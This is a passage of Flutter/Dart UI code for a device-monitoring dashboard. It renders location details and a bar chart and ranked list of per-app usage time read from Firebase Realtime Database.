                        const SizedBox(height: 4),
                        Text(
                          addr,
                          style: const TextStyle(
                              color  : Colors.white38,
                              fontSize: 11),
                          textAlign: TextAlign.center,
                        ),
                      ],
                    ],
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),

            // Info grid
            Wrap(
              spacing: 12, runSpacing: 12,
              children: [
                _InfoTile('Latitude',   lat.toStringAsFixed(6)),
                _InfoTile('Longitude',  lng.toStringAsFixed(6)),
                _InfoTile('Accuracy',   '${acc.toStringAsFixed(0)} m'),
                _InfoTile('Speed',      '${(spd * 3.6).toStringAsFixed(1)} km/h'),
                _InfoTile('Last Update', time, wide: true),
                if (addr.isNotEmpty)
                  _InfoTile('Address', addr, wide: true),
              ],
            ),
          ],
        );
      },
    );
  }
}

class _InfoTile extends StatelessWidget {
  const _InfoTile(this.label, this.value, {this.wide = false});
  final String label, value;
  final bool wide;

  @override
  Widget build(BuildContext context) {
    final width = wide
        ? MediaQuery.of(context).size.width - 32
        : (MediaQuery.of(context).size.width - 44) / 2;

    return Container(
      width  : width,
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(14),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label,
              style: const TextStyle(color: Colors.white38, fontSize: 11)),
          const SizedBox(height: 6),
          Text(value,
              style: const TextStyle(
                  color     : Colors.white,
                  fontSize  : 13,
                  fontWeight: FontWeight.w600)),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 3 — ACTIVITY (App Usage)
// ═══════════════════════════════════════════════════════════════════════════════

class _ActivityTab extends StatelessWidget {
  const _ActivityTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final usageRef =
        FirebaseDatabase.instance.ref('devices/$deviceId/appUsage');

    return StreamBuilder<DatabaseEvent>(
      stream: usageRef.onValue,
      builder: (context, snap) {
        if (!snap.hasData) {
          return const Center(child: CircularProgressIndicator());
        }
        if (snap.data!.snapshot.value == null) {
          return _EmptyCard(
              icon   : Icons.bar_chart_rounded,
              message: 'No usage data yet.\nGrant "Usage access" in Settings.');
        }

        final root   = Map<String, dynamic>.from(snap.data!.snapshot.value as Map);
        final data   = root['data'] as Map? ?? {};
        final tsMs   = root['updatedAt'] as int? ?? 0;
        final syncAt = DateFormat('HH:mm').format(
            DateTime.fromMillisecondsSinceEpoch(tsMs));

        final entries = data.values
            .map((e) {
              final m = Map<String, dynamic>.from(e as Map);
              return _UsageEntry(
                name   : m['name']    as String? ?? '',
                seconds: m['seconds'] as int?    ?? 0,
              );
            })
            .where((e) => e.seconds > 0)
            .toList()
          ..sort((a, b) => b.seconds.compareTo(a.seconds));

        final top    = entries.take(8).toList();
        final maxSec = top.isEmpty ? 1 : top.first.seconds;

        return ListView(
          padding: const EdgeInsets.fromLTRB(16, 20, 16, 30),
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                _SectionLabel('Top Apps · Last 24 h'),
                Text('Synced $syncAt',
                    style: const TextStyle(
                        color: Colors.white30, fontSize: 11)),
              ],
            ),
            const SizedBox(height: 14),

            // Bar chart
            Container(
              height    : 210,
              padding   : const EdgeInsets.fromLTRB(8, 16, 8, 8),
              decoration: BoxDecoration(
                color       : _kCard,
                borderRadius: BorderRadius.circular(18),
              ),
              child: BarChart(
                BarChartData(
                  barTouchData: BarTouchData(enabled: false),
                  gridData   : FlGridData(show: false),
                  borderData : FlBorderData(show: false),
                  titlesData : FlTitlesData(
                    leftTitles  : AxisTitles(
                        sideTitles: SideTitles(showTitles: false)),
                    rightTitles : AxisTitles(
                        sideTitles: SideTitles(showTitles: false)),
                    topTitles   : AxisTitles(
                        sideTitles: SideTitles(showTitles: false)),
                    bottomTitles: AxisTitles(
                      sideTitles: SideTitles(
                        showTitles  : true,
                        reservedSize: 28,
                        getTitlesWidget: (v, _) {
                          final i = v.toInt();
                          if (i < 0 || i >= top.length) {
                            return const SizedBox.shrink();
                          }
                          final name = top[i].name;
                          return Padding(
                            padding: const EdgeInsets.only(top: 6),
                            child: Text(
                              name.length > 7 ? name.substring(0, 7) : name,
                              style: const TextStyle(
                                  color: Colors.white30, fontSize: 8.5),
                            ),
                          );
                        },
                      ),
                    ),
                  ),
                  barGroups: List.generate(top.length, (i) {
                    final fraction = top[i].seconds / maxSec;
                    return BarChartGroupData(
                      x: i,
                      barRods: [
                        BarChartRodData(
                          toY           : top[i].seconds.toDouble(),
                          width         : 20,
                          borderRadius  : BorderRadius.circular(5),
                          gradient      : LinearGradient(
                            colors: [
                              _kPrimary.withOpacity(0.4 + fraction * 0.6),
                              _kGreen.withOpacity(0.4 + fraction * 0.6),
                            ],
                            begin: Alignment.bottomCenter,
                            end  : Alignment.topCenter,
                          ),
                          backDrawRodData: BackgroundBarChartRodData(
                            show : true,
                            toY  : maxSec.toDouble(),
                            color: Colors.white.withOpacity(0.04),
                          ),
                        ),
                      ],
                    );
                  }),
                ),
              ),
            ),
            const SizedBox(height: 16),

            // List
            Container(
              decoration: BoxDecoration(
                color: _kCard, borderRadius: BorderRadius.circular(16)),
              child: Column(
                children: top.asMap().entries.map((entry) {
                  final i = entry.key;
                  final e = entry.value;
                  final mins = e.seconds ~/ 60;
                  final secs = e.seconds % 60;
                  final label = mins > 0
                      ? '${mins}m ${secs}s'
                      : '${secs}s';
                  final pct =
                      (e.seconds / maxSec * 100).toStringAsFixed(0);

                  return Column(
                    children: [
                      ListTile(
                        leading: Container(
                          padding    : const EdgeInsets.all(7),
                          decoration : BoxDecoration(
                            color       : _kPrimary.withOpacity(0.12),
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: Text(
                            '${i + 1}',
                            style: const TextStyle(
                                color     : _kPrimary,
                                fontWeight: FontWeight.w800,
                                fontSize  : 12),
                          ),
                        ),
                        title: Text(e.name,
                            style: const TextStyle(
                                fontWeight: FontWeight.w600,
                                fontSize  : 13)),
                        subtitle: LinearProgressIndicator(
                          value           : e.seconds / maxSec,
                          backgroundColor : Colors.white.withOpacity(0.06),
                          valueColor      : const AlwaysStoppedAnimation(_kPrimary),
                          borderRadius    : BorderRadius.circular(4),
                          minHeight       : 4,
                        ),
                        trailing: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          crossAxisAlignment: CrossAxisAlignment.end,
                          children: [
                            Text(label,
                                style: const TextStyle(
                                    color     : _kGreen,
                                    fontWeight: FontWeight.w700,
                                    fontSize  : 12)),
                            Text('$pct%',
                                style: const TextStyle(
                                    color  : Colors.white30,
                                    fontSize: 10)),
                          ],
                        ),
                      ),
                      if (i < top.length - 1)
                        const Divider(
                            color: Colors.white10, height: 1, indent: 52),
                    ],
                  );
                }).toList(),
              ),
            ),
          ],
        );
      },
    );
  }
}

class _UsageEntry {
  const _UsageEntry({required this.name, required this.seconds});
  final String name;
  final int seconds;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SHARED WIDGETS
// ═══════════════════════════════════════════════════════════════════════════════

class _SectionLabel extends StatelessWidget {
  const _SectionLabel(this.text);
  final String text;

  @override
  Widget build(BuildContext context) {
    return Text(
      text.toUpperCase(),
      style: const TextStyle(
        color      : Colors.white38,
        fontSize   : 10.5,
        fontWeight : FontWeight.w700,
        letterSpacing: 1.6,
      ),
    );
  }
}

class _EmptyCard extends StatelessWidget {
  const _EmptyCard({required this.icon, required this.message});
  final IconData icon;
  final String message;

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(40),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, size: 54, color: Colors.white10),
            const SizedBox(height: 16),
            Text(
              message,
              textAlign: TextAlign.center,
              style: const TextStyle(
                  color: Colors.white30, fontSize: 13, height: 1.6),
            ),
          ],
        ),
      ),
    );
  }
}
